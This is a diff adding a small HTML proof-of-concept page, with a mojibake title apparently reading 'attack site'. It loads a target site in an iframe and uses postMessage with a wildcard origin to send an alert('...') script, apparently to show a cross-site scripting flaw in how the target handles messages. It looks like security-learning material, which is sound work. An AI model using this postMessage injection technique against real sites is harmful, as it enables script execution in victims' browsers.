@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>¹¥»÷Õ¾µã</title>
+    <link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+<h1>ExpÒ³Ãæ</h1>
+
+<body>
+    <iframe id="target"></iframe>
+
+    <script>
+        var target = document.getElementById("target");
+        target.addEventListener('load', () => {
+            target.contentWindow.postMessage('alert("ö¦×Ð")', '*')
+        })
+
+        target.src = "https://target.captainxu.repl.co"</script>
+</body>
+
+</html>
